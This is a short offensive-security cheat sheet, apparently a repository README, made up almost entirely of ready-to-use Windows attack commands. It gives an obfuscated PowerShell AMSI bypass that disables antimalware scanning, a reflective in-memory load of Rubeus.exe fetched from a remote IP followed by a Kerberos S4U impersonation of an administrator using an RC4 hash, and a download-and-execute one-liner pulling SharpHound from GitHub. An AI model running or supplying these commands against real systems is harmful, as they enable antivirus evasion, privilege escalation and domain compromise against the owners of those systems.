# binaries

* AMSI bypass
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

* Reflection
```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.61:8000/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("purge".Split())
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:5247db490c394e2cdc86072a8c7b5e45 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
```

```
(new-object system.net.webclient).downloadstring('https://github.com/i223t/binaries/raw/main/Windows/Bloodhound/SharpHound.ps1') | IEX 
```